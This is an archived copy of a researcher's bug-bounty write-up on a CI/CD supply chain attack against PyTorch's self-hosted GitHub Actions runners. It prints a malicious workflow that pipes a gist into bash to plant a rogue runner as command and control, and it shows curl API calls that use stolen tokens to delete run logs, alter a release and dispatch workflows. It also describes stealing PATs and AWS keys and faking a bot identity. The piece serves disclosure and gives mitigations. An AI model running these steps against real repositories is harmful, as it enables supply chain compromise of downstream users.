---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-11_playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch.md
original_filename: 2024-01-11_playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch.md
title: Playing With Fire – How We Executed A Critical Supply Chain Attack On Pytorch
category: documents
detected_topics:
- cloud-security
- command-injection
- supply-chain
- sso
- access-control
- otp
tags:
- imported
- documents
- cloud-security
- command-injection
- supply-chain
- sso
- access-control
- otp
language: en
raw_sha256: e6f068a45d70ede4ecb527421feaf0ae6148c1147fe51c2d11cad69ec9d3c9af
text_sha256: d39446cc6a4e51e93119197a21066d00eda81c886fbb0077c22b80d342591d57
ingested_at: '2026-06-28T07:32:29Z'
sensitivity: unknown
redactions_applied: true
---

# Playing With Fire – How We Executed A Critical Supply Chain Attack On Pytorch

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-11_playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch.md
- Source Type: markdown
- Detected Topics: cloud-security, command-injection, supply-chain, sso, access-control, otp
- Ingested At: 2026-06-28T07:32:29Z
- Redactions Applied: True
- Raw SHA256: `e6f068a45d70ede4ecb527421feaf0ae6148c1147fe51c2d11cad69ec9d3c9af`
- Text SHA256: `d39446cc6a4e51e93119197a21066d00eda81c886fbb0077c22b80d342591d57`


## Content

---
title: "Playing With Fire – How We Executed A Critical Supply Chain Attack On Pytorch"
page_title: "Playing with Fire – How We Executed a Critical Supply Chain Attack on PyTorch – John Stawinski IV"
url: "https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/"
final_url: "https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/"
authors: ["John Stawinski", "Adnan Khan (@adnanthekhan)"]
programs: ["PyTorch", "Meta / Facebook"]
bugs: ["CI/CD", "Supply chain attack"]
bounty: "5,500"
publication_date: "2024-01-11"
added_date: "2024-01-18"
source: "pentester.land/writeups.json"
original_index: 560
---

January 11, 2024

# Playing with Fire – How We Executed a Critical Supply Chain Attack on PyTorch

Security tends to lag behind adoption, and AI/ML is no exception. 

Four months ago, [Adnan Khan](https://adnanthekhan.com/) and I exploited a critical CI/CD vulnerability in [PyTorch](https://github.com/pytorch/pytorch), one of the world’s leading ML platforms. Used by titans like **Google, Meta, Boeing, and Lockheed Martin** , PyTorch is a major target for hackers and nation-states alike. 

Thankfully, we exploited this vulnerability before the bad guys.

Here is how we did it.

# Background

Before we dive in, let’s scope out and discuss why Adnan and I were looking at an ML repository. Let me give you a hint — it was not to gawk at the neural networks. In fact, I don’t know enough about neural networks to be qualified to gawk.

PyTorch was one of the first steps on a journey Adnan and I started six months ago, based on CI/CD research and exploit development we performed in the summer of 2023. Adnan started the bug bounty foray by leveraging these attacks to exploit a [critical vulnerability in GitHub](https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/) that allowed him to backdoor all of GitHub’s and Azure’s runner images, collecting a $20,000 reward. Following this attack, we teamed up to discover other vulnerable repositories.

The results of our research surprised everyone, including ourselves, as we continuously executed**supply chain compromises of**[**leading ML platforms, billion-dollar Blockchains,**](https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/)**and more**. In the seven days since we released our initial blog posts, they’ve [caught on in the security world](https://www.securityweek.com/major-it-crypto-firms-exposed-to-supply-chain-compromise-via-new-class-of-ci-cd-attack/). 

But, you probably didn’t come here to read about our journey; you came to read about the messy details of our attack on PyTorch. Let’s begin.

# Tell Me the Impact

Our exploit path resulted in the ability to upload malicious PyTorch releases to GitHub, upload releases to AWS, potentially add code to the main repository branch, backdoor PyTorch dependencies – the list goes on. **In short, it was bad. Quite bad.**

As we’ve seen before with [SolarWinds](https://www.techtarget.com/whatis/feature/SolarWinds-hack-explained-Everything-you-need-to-know), [Ledger](https://www.coindesk.com/consensus-magazine/2023/12/14/what-we-know-about-the-massive-ledger-hack/), and others, supply chain attacks like this are killer from an attacker’s perspective. **With this level of access, any respectable nation-state would have several paths to a PyTorch supply chain compromise**.

# GitHub Actions Primer

To understand our exploit, you need to understand GitHub Actions.

_Want to skip around? Go ahead_.

  1. [Background](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#background)
  2. [Tell Me the Impact](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#tell-me-the-impact)
  3. [GitHub Actions Primer](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#github-actions-primer)
  1. [Self-Hosted Runners](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#self-hosted-runners)
  4. [Identifying the Vulnerability](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#identifying-the-vulnerability)
  1. [Identifying Self-Hosted Runners](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#identifying-self-hosted-runners)
  2. [Determining Workflow Approval Requirements](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#determining-workflow-approval-requirements)
  3. [Searching for Impact](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#searching-for-impact)
  5. [Executing the Attack](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#executing-the-attack)
  1. [1\. Fixing a Typo](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#1-fixing-a-typo)
  2. [2\. Preparing the Payload](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#2-preparing-the-payload)
  6. [Post Exploitation](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#post-exploitation)
  1. [The Great Secret Heist](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#the-great-secret-heist)
  1. [The Magical GITHUB_TOKEN](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#the-magical-github-token)
  2. [Covering our Tracks](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#covering-our-tracks)
  3. [Modifying Repository Releases](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#modifying-repository-releases)
  4. [Repository Secrets](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#repository-secrets)
  5. [PAT Access](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#pat-access)
  6. [AWS Access](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#aws-access)
  7. [Submission Details – No Bueno](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#submission-details-no-bueno)
  1. [Timeline](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#timeline)
  8. [Mitigations](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#mitigations)
  9. [Is PyTorch an Outlier?](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#is-pytorch-an-outlier)
  10. [References](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/#references)

If you’ve never worked with GitHub Actions or similar CI/CD platforms, I recommend [reading up](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions) before continuing this blog post. Actually, if I lose you at any point, go and Google the technology that confused you. Typically, I like to start from the very basics in my articles, but explaining all the involved CI/CD processes would be a novel in itself.

In short, **GitHub Actions allow the execution of code specified within workflows as part of the CI/CD process.**

For example, let’s say PyTorch wants to run a set of tests when a GitHub user submits a pull request. PyTorch can define these tests in a YAML workflow file used by GitHub Actions and configure the workflow to run on the _pull_request_ trigger. Now, whenever a user submits a pull request, the tests will execute on a runner. This way, repository maintainers don’t need to manually test everyone’s code before merging. 

The public PyTorch repository uses GitHub Actions extensively for CI/CD. Actually, extensively is an understatement. PyTorch has over 70 different GitHub workflows and typically runs over ten workflows every hour. One of the most difficult parts of this operation was scrolling through all of the different workflows to select the ones we were interested in.

GitHub Actions workflows execute on two types of build runners. One type is GitHub’s hosted runners, which GitHub maintains and hosts in their environment. **The other class is self-hosted runners.**

## Self-Hosted Runners

Self-hosted runners are build agents hosted by end users running the Actions runner agent on their own infrastructure. In less technical terms, a “self-hosted runner” is a machine, VM, or container configured to run GitHub workflows from a GitHub organization or repository. Securing and protecting the runners is the responsibility of end users, not GitHub, which is why GitHub recommends against using self-hosted runners on public repositories. **Apparently, not everyone listens to GitHub,**[**including GitHub**](https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/)**.**

It doesn’t help that some of GitHub’s default settings are less than secure. By default, when a self-hosted runner is attached to a repository, any of that repository’s workflows can use that runner. This setting also applies to workflows from fork pull requests. Remember that **anyone** can submit a fork pull request to a public GitHub repository. **Yes, even you.** The result of these settings is that, by default, any repository contributor can execute code on the self-hosted runner by submitting a malicious PR.

_Note: A “contributor” to a GitHub repository is anyone who has added code to the repository. Typically, someone becomes a contributor by submitting a pull request that then gets merged into the default branch. More on this later._

If the self-hosted runner is configured using the default steps, it will be a non-ephemeral self-hosted runner. This means that the malicious workflow can start a process in the background that will continue to run after the job completes, and modifications to files (such as programs on the path, etc.) will persist past the current workflow. It also means that **future workflows will run on that same runner**.

# Identifying the Vulnerability

## Identifying Self-Hosted Runners

To identify self-hosted runners, we ran [Gato](https://github.com/praetorian-inc/gato), a GitHub attack and exploitation tool developed by [Praetorian](https://www.praetorian.com/). Among other things, Gato can enumerate the existence of self-hosted runners within a repository by examining GitHub workflow files and run logs. 

Gato identified several persistent, self-hosted runners used by the PyTorch repository. We looked at repository workflow logs to confirm the Gato output.

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-2.png)

_The name “worker-rocm-amd-30” indicates the runner is self-hosted._

## Determining Workflow Approval Requirements

Even though PyTorch used self-hosted runners, one major thing could still stop us.

The default setting for workflow execution from fork PRs requires approval only for accounts that have not previously contributed to the repository. However, there is an option to allow workflow approval for all fork PRs, including previous contributors. **We set out to discover the status of this setting.**

Viewing the pull request (PR) history, we found several PRs from previous contributors that triggered _pull_request_ workflows without requiring approval. This indicated that the repository did not require workflow approval for Fork PRs from previous contributors. **Bingo.**

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-12.png)

_Nobody had approved this fork PR workflow, yet the “Lint / quick-checks / linux-job” workflow ran on_ pull_request _, indicating the default approval setting was likely in place._

## Searching for Impact

Before executing these attacks, we like to identify GitHub secrets that we may be able to steal after landing on the runner. Workflow files revealed several GitHub secrets used by PyTorch, including but not limited to:

  * “aws-pytorch-uploader-secret-access-key”
  * “***REDACTED-AWS-KEY***-id”
  * “GH_PYTORCHBOT_TOKEN” (GitHub Personal Access Token)
  * “UPDATEBOT_TOKEN” (GitHub Personal Access Token)
  * “conda-pytorchbot-token”

We were psyched when we saw the GH_PYTORCHBOT_TOKEN and UPDATEBOT_TOKEN. **A PAT is one of your most valuable weapons if you want to launch a supply chain attack.**

Using self-hosted runners to compromise GitHub secrets is not always possible. Much of our research has been around self-hosted runner post-exploitation; figuring out methods to go from runner to secrets. PyTorch provided a great opportunity to test these techniques in the wild.

# Executing the Attack

## 1\. Fixing a Typo

We needed to be a contributor to the PyTorch repository to execute workflows, but we didn’t feel like spending time adding features to PyTorch. Instead, we found a typo in a markdown file and submitted a fix. **Another win for the Grammar Police.**

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-11.png)

_Yes, I’m re-using this meme from my_[ _last article_](https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/) _, but it fits too well._

## 2\. Preparing the Payload

Now we had to craft a workflow payload that would allow us to obtain persistence on the self-hosted runner. Red Teamers know that installing persistence in production environments typically isn’t as trivial as a reverse Netcat shell. EDR, firewalls, packet inspection, and more can be in play, particularly in large corporate environments. 

When we started these attacks, we asked ourselves the following question – what could we use for Command and Control (C2) that we know for sure would bypass EDR with traffic that would not be blocked by any firewall? The answer is elegant and obvious – **we could install another self-hosted GitHub runner** and attach it to our private GitHub organization. 

Our “Runner on Runner” (RoR) technique uses the same servers for C2 as the existing runner, and the only binary we drop is the official GitHub runner agent binary, which is already running on the system. See ya, EDR and firewall protections.

We created a script to automate the runner registration process and included that as our malicious workflow payload. Storing our payload in a gist, we submitted a malicious draft PR. The modified workflow looked something like this:

> name: “🚨 pre-commit”
> 
> run-name: “Refactoring and cleanup”
> 
> on:
> 
> pull_request:
> 
> branches: main
> 
> jobs:
> 
> build:
> 
> name: Linux ARM64
> 
> runs-on: ${{ matrix.os }}
> 
> strategy:
> 
> matrix:
> 
> os: [
> 
> {system: “ARM64”, name: “Linux ARM64”},
> 
> {system: “benchmark”, name: “Linux Intel”},
> 
> {system: “glue-notify”, name: “Windows Intel”}
> 
> ]
> 
> steps:
> 
> – name: Lint Code Base
> 
> continue-on-error: true
> 
> env:
> 
> VERSION: ${{ matrix.version }}
> 
> SYSTEM_NAME: ${{ matrix.os }}
> 
> run: curl <GIST_URL> | bash

This workflow executes the RoR gist payload on three of PyTorch’s self-hosted runners – a Linux ARM64 machine named “ARM64”, an Intel device named “benchmark,” and a Windows box named “glue-notify.” 

Enabling draft status ensured that repository maintainers wouldn’t receive a notification. However, with the complexity of PyTorch’s CI/CD environment, I’d be surprised if they noticed either way. We submitted the PR and installed our RoR C2 on each self-hosted runner.

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-7.png)

_We used our C2 repository to execute the_ pwd && ls && /home && ip a _command on the runner labeled “jenkins-worker-rocm-amd-34”, confirming stable C2 and remote code execution. We also ran_ sudo -l _to confirm we had root access._

# Post Exploitation

We now had root on a self-hosted runner. **So what?** We had seen previous reports of gaining RCE on self-hosted runners, and they were often met with ambiguous responses due to their ambiguous impact. Given the complexity of these attacks, we wanted to demonstrate a legitimate impact on PyTorch to convince them to take our report seriously. And we had some cool new post-exploitation techniques we’d been wanting to try.

## The Great Secret Heist

In cloud and CI/CD environments, **secrets are king**. When we began our post-exploitation research, we focused on the secrets an attacker could steal and leverage in a typical self-hosted runner setup. Most of the secret stealing starts with the _GITHUB_TOKEN_. 

### The Magical GITHUB_TOKEN

Typically, a workflow needs to checkout a GitHub repository to the runner’s filesystem, whether to run tests defined in the repository, commit changes, or even publish releases. The workflow can use a _GITHUB_TOKEN_ to authenticate to GitHub and perform these operations. _GITHUB_TOKEN_ permissions can vary from read-only access to extensive write privileges over the repository. If a workflow executes on a self-hosted runner and uses a _GITHUB_TOKEN_ , that token will be on the runner for the duration of that build.

PyTorch had several workflows that used the _actions/checkout_ step with a _GITHUB_TOKEN_ that had **write permissions**. For example, by searching through workflow logs, we can see the _periodic.yml_ workflow also ran on the _jenkins-worker-rocm-amd-34_ self-hosted runner. The logs confirmed that this workflow used a _GITHUB_TOKEN_ with extensive write permissions. 

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-3.png)

This token would only be valid for the life of that particular build. However, we developed some special techniques to extend the build length once you are on the runner (more on this in a future post). Due to the insane number of workflows that run daily from the PyTorch repository, we were not worried about tokens expiring, as we could always compromise another one.

When a workflow uses the _actions/checkout_ step, the _GITHUB_TOKEN_ is stored in the _.git/config_ file of the checked-out repository on the self-hosted runner during an active workflow. Since we controlled the runner, all we had to do was wait until a non-PR workflow ran on the runner with a privileged _GITHUB_TOKEN_ and then print out the contents of the _config_ file. 

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-6.png)

**_We used our RoR C2 to steal the_****GITHUB_TOKEN**** _of an ongoing workflow with write permissions._**

### Covering our Tracks

Our first use of the _GITHUB_TOKEN_ was to eliminate the run logs from our malicious pull request. We wanted a full day to perform post-exploitation and didn’t want to cause any alarms from our activity. We used the GitHub API along with the token to delete the run logs for each of the workflows our PR triggered. **Stealth mode = activated.**

> curl -L \
> 
> -X DELETE \
> 
> -H “Accept: application/vnd.github+json” \
> 
> -H “Authorization: Bearer $STOLEN_TOKEN” \
> 
> -H “X-GitHub-Api-Version: 2022-11-28” \
> 
> <a href="<https://api.github.com/repos/pytorch/pytorch/runs/https://api.github.com/repos/pytorch/pytorch/runs/><run_id>

If you want a challenge, you can try to discover the workflows associated with our initial malicious PR and observe that the logs no longer exist. In reality, they likely wouldn’t have caught our workflows anyway. PyTorch has so many workflow runs that it reaches the limit for a single repository after a few days.

### Modifying Repository Releases

Using the token, **we could upload an asset claiming to be a pre-compiled, ready-to-use PyTorch binary** and add a release note with instructions to run and download the binary. Any users that downloaded the binary would then be running our code. If the current source code assets were not pinned to the release commit, the attacker could overwrite those assets directly. As a POC, we used the following cURL request to modify the name of a PyTorch GitHub release. We just as easily could have uploaded our own assets.

> curl -L \
> 
> -X PATCH \
> 
> -H “Accept: application/vnd.github+json” \
> 
> -H “Authorization: Bearer $GH_TOKEN” \
> 
> -H “X-GitHub-Api-Version: 2022-11-28” \
> 
> <https://api.github.com/repos/pytorch/pytorch/releases/102257798> \
> 
> -d ‘{“tag_name”:”v2.0.1″,”name”:”PyTorch 2.0.1 Release, bug fix release (- John Stawinski)”}’

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-10.png)

_As a POC, we added my name to the latest PyTorch release at the time. A malicious attacker could execute a similar API request to replace the latest release artifact with their malicious artifact._

### Repository Secrets

If backdooring PyTorch repository releases sounds fun, well, **that is only a fraction of the impact we achieved** when we looked at repository secrets.

The PyTorch repository used GitHub secrets to allow the runners to access sensitive systems during the automated release process. The repository used **a lot** of secrets, including several sets of AWS keys and GitHub Personal Access Tokens (PATs) discussed earlier.

Specifically, the _weekly.yml_ workflow used the _GH_PYTORCHBOT_TOKEN_ and _UPDATEBOT_TOKEN_ secrets to authenticate to GitHub. GitHub Personal Access Tokens (PATs) are often overprivileged, making them a great target for attackers. This workflow did not run on a self-hosted runner, so we couldn’t wait for a run and then steal the secrets from the filesystem (a technique we use frequently).

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-13.png)

_The weekly.yml workflow used two PATs as secrets. This workflow called the _update-commit-hash workflow, which specified use of a GitHub-hosted runner._

Even though this workflow wouldn’t run on our runner, the _GITHUB_TOKENs_ we could compromise had _actions:write_ privileges. We could use the token to trigger workflows with the workflow_dispatch event. Could we use that to run our malicious code in the context of the _weekly.yml_ workflow? 

We had some ideas but weren’t sure whether they’d work in practice. **So, we decided to find out.**

It turns out that you can’t use a _GITHUB_TOKEN_ to modify workflow files. However, we discovered several creative…”workarounds”…that will let you add malicious code to a workflow using a _GITHUB_TOKEN_. In this scenario, _weekly.yml_ used another workflow, which used a script outside the _.github/workflows_ directory. We could add our code to this script in our branch. Then, **we could trigger that workflow on our branch, which would execute our malicious code**.

If this sounds confusing, don’t worry; it also confuses most bug bounty programs. Hopefully, we’ll get to provide an in-depth look at this and our other post-exploitation techniques at a certain **security conference in LV, NV**. If we don’t get that opportunity, we’ll cover our other methods in a future blog post.

Back to the action. To execute this phase of the attack, we compromised another _GITHUB_TOKEN_ and used it to clone the PyTorch repository.**We created our own branch, added our payload, and triggered the workflow.**

As a stealth bonus, we changed our git username in the commit to _pytorchmergebot_ , so that our commits and workflows appeared to be triggered by the _pytorchmergebot_ user, who interacted frequently with the PyTorch repository.

Our payload ran in the context of the _weekly.yml_ workflow, which used the GitHub secrets we were after. The payload encrypted the two GitHub PATs and printed them to the workflow log output. We protected the private encryption key so that only we could perform decryption.

We triggered the _weekly.yml_ workflow on our _citesting1112_ branch using the following cURL command.

> curl -L \
> 
> -X POST \
> 
> -H “Accept: application/vnd.github+json” \
> 
> -H “Authorization: Bearer $STOLEN_TOKEN” \
> 
> -H “X-GitHub-Api-Version: 2022-11-28” \
> 
> <https://api.github.com/repos/pytorch/pytorch/actions/workflows/weekly.yml/dispatches> \
> 
> -d ‘{“ref”:”citesting1112″}’

Navigating to the PyTorch “Actions” tab, **we saw our encrypted output** containing the PATs in the results of the “Weekly” workflow.

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-15.png)

Finally, we canceled the workflow run and deleted the logs.

### PAT Access

After **decrypting the GitHub PATs** , we enumerated their access with Gato.

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-14.png)

_We decrypted the PATs with our private key._

Gato revealed the PATs had access to over **93 repositories within the PyTorch organization** , including many private repos and administrative access over several. These PATs provided **multiple paths to supply chain compromise**. 

For example, if an attacker didn’t want to bother with tampering releases, they could likely add code directly to the main branch of PyTorch. The main branch was protected, but the PAT belonging to _pytorchbot_ could create a new branch and add its own code, and then the PAT belonging to _pytorchupdatebot_ could approve the PR. We could then use _pytorchmergebot_ to trigger the merge.

We didn’t use that attack path to add code to the main branch, but existing PyTorch PRs indicated it was possible. Even if an attacker couldn’t push directly to the main branch, there are other paths to supply chain compromise.

If the threat actor wanted to be more stealthy, they could add their malicious code to one of the other private or public repositories used by PyTorch within the PyTorch organization. These repositories had less visibility and were less likely to be closely reviewed. Or, they could smuggle their code into a feature branch, or steal more secrets, or do any number of creative techniques to compromise the PyTorch supply chain. 

### AWS Access

To prove that the PAT compromise was not a one-off, we decided to steal more secrets – this time, AWS keys.

We won’t bore you with all the details, but we executed a similar attack to the one above to steal the _aws-pytorch-uploader-secret-access-key_ and _***REDACTED-AWS-KEY***-id_ belonging to the _pytorchbot_ AWS user. These AWS keys had privileges to upload PyTorch releases to AWS, providing another path to backdoor PyTorch releases. The impact of this attack would depend on the sources that pulled releases from AWS and the other assets in this AWS account.

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-5.png)

_We used the AWS CLI to confirm the AWS credentials belonged to the pytorchbot AWS user._

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-9.png)

_We listed the contents of the “pytorch” bucket, revealing many sensitive artifacts, including PyTorch releases._

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-8.png)

_We discovered production PyTorch artifacts and confirmed write access to S3. We later confirmed that the PyTorch website pulls directly from these releases, so backdooring releases in these S3 buckets would allow an attacker to compromise any user that downloaded PyTorch from the PyTorch website, whether manually or with a `pip install`._

There were other sets of AWS keys, GitHub PATs, and various credentials we could have stolen, but we believed we had a clear demonstration of impact at this point. Given the critical nature of the vulnerability, we wanted to submit the report as soon as possible before one of PyTorch’s 3,500 contributors decided to make a deal with a foreign adversary.

![](https://johnstawinski.com/wp-content/uploads/2024/01/image-4.png)

_A full attack path diagram._

# Submission Details – No Bueno

Overall, the PyTorch submission process was blah, to use a technical term. They frequently had long response times, and their fixes were questionable. 

We also learned this wasn’t the first time they had issues with self-hosted runners – earlier in 2023, Marcus Young executed a pipeline attack to gain RCE on a single PyTorch runner. Marcus did not perform the post-exploitation techniques we used to demonstrate impact, but PyTorch still should have locked down their runners after his submission. [Marcus’ report](https://marcyoung.us/post/zuckerpunch/) earned him a $10,000 bounty. 

We haven’t investigated PyTorch’s new setup enough to provide our opinion on their solution to securing their runners. Rather than require approval for contributor’s fork PRs, PyTorch opted to implement a layer of controls to prevent abuse. 

## Timeline

August 9th, 2023 – Report submitted to Meta bug bounty

August 10th, 2023 – Report “sent to appropriate product team”

September 8th, 2023 – We reached out to Meta to ask for an update

September 12th, 2023 – Meta said there is no update to provide

October 16th, 2023 – Meta said “we consider the issue mitigated, if you think this wasn’t fully mitigated, please let us know.”

October 16th, 2023 – We responded by saying we believed the issue had not been fully mitigated.

November 1st, 2023 – We reached out to Meta, asking for another update.

November 21st, 2023 – Meta responded, saying they reached out to a team member to provide an update.

December 7th, 2023 – After not receiving an update, we sent a strongly worded message to Meta, expressing our concerns about the disclosure process and the delay in remediation.

December 7th, 2023 – Meta responded, saying they believed the issue was mitigated and the delay was regarding the bounty.

December 7th, 2023 – Several back-and-forths ensued discussing remediation.

December 15th, 2023 – Meta awarded a $5000 bounty, plus 10% due to the delay in payout.

December 15th, 2023 – Meta provided more detail as to the remediation steps they performed after the initial vulnerability disclosure and offered to set up a call if we had more questions.

December 16th, 2023 – We responded, opting not to set up a call, and asked a question about bounty payout (at this point, we were pretty done with looking at PyTorch).

# Mitigations

The easiest way to mitigate this class of vulnerability is to change the default setting of ‘Require approval for first-time contributors’ to ‘Require approval for all outside collaborators’. It is a no-brainer for any public repository that uses self-hosted runners to ensure they use the restrictive setting, although PyTorch seems to disagree.

If workflows from fork-PRs are necessary, organizations should only use GitHub-hosted runners. If self-hosted runners are also necessary, use isolated, ephemeral runners and ensure you know the risks involved.

It is challenging to design a solution allowing anyone to run arbitrary code on your infrastructure without risks, especially in an organization like PyTorch that thrives off community contributions. 

# Is PyTorch an Outlier?

The issues surrounding these attack paths are not unique to PyTorch. They’re not unique to ML repositories or even to GitHub. We’ve repeatedly demonstrated supply chain weaknesses by exploiting CI/CD vulnerabilities in the world’s [most advanced technological organizations](https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/) across several CI/CD platforms, and those are only a small subset of the greater attack surface. 

Threat actors are starting to catch on, as shown by the year-over-year increase in supply chain attacks. Security researchers won’t always be able to find these vulnerabilities before malicious attackers.

But in this case, the researchers got there first.

_Want to hear more? Subscribe to the[official John IV newsletter](https://johnstawinski.ck.page/2034b623ad)_  _to receive live, monthly updates of my interests and passions._

# References

  * <https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/>
  * <https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/>
  * <https://marcyoung.us/post/zuckerpunch/>
  * <https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/>
  * <https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/>
  * <https://github.com/nikitastupin/pwnhub>
  * <https://0xn3va.gitbook.io/cheat-sheets/ci-cd/github/actions>
  * <https://owasp.org/www-project-top-10-ci-cd-security-risks/>

### Share this:

  * [ Share on X (Opens in new window) X ](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/?share=facebook)
  * 

Like Loading…

Categories:

[Uncategorized](https://johnstawinski.com/category/uncategorized/)

· Tagged:

* * *

[Previous Post](https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/)

* * *

[Next Post](https://johnstawinski.com/2024/04/15/fixing-typos-and-breaching-microsofts-perimeter/)

## 6 responses to “Playing with Fire – How We Executed a Critical Supply Chain Attack on PyTorch”

  1. [Worse than SolarWinds: Three Steps to Hack Blockchains, GitHub, and ML through GitHub Actions – John Stawinski IV](https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/)

[January 11, 2024](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/#comment-479)

[…] Compromising PyTorch releases (update – a full walkthrough of this attack is now available in Playing with Fire – How We Executed a Critical Supply Chain Attack on PyTorch) […]

[Like](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/?like_comment=479&_wpnonce=08d05cd49c)Like

[Reply](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/?replytocom=479#respond)

  2. [New Class of CI/CD Attacks Could Have Led to PyTorch Supply Chain Compromise – Cyber Social Hub](https://cybersocialhub.com/csh/new-class-of-ci-cd-attacks-could-have-led-to-pytorch-supply-chain-compromise/)

[January 12, 2024](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/#comment-481)

[…] machine learning (ML) framework PyTorch, Stawinski explains, was one of their first targets, given its popularity. The child of Meta AI and now part of the […]

[Like](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/?like_comment=481&_wpnonce=2f000225b1)Like

[Reply](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/?replytocom=481#respond)

  3. [A "Critical Supply Chain Attack" on the PyTorch Infrastructure Raises Concerns — and a Bug Bounty – The Star News Today](https://www.thestarnewstoday.com/a-critical-supply-chain-attack-on-the-pytorch-infrastructure-raises-concerns-and-a-bug-bounty/)

[January 17, 2024](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/#comment-499)

[…] Stawinski’s full write-up is available on his website. […]

[Like](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/?like_comment=499&_wpnonce=99c904d876)Like

[Reply](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/comment-page-1/?replytocom=499#respond)

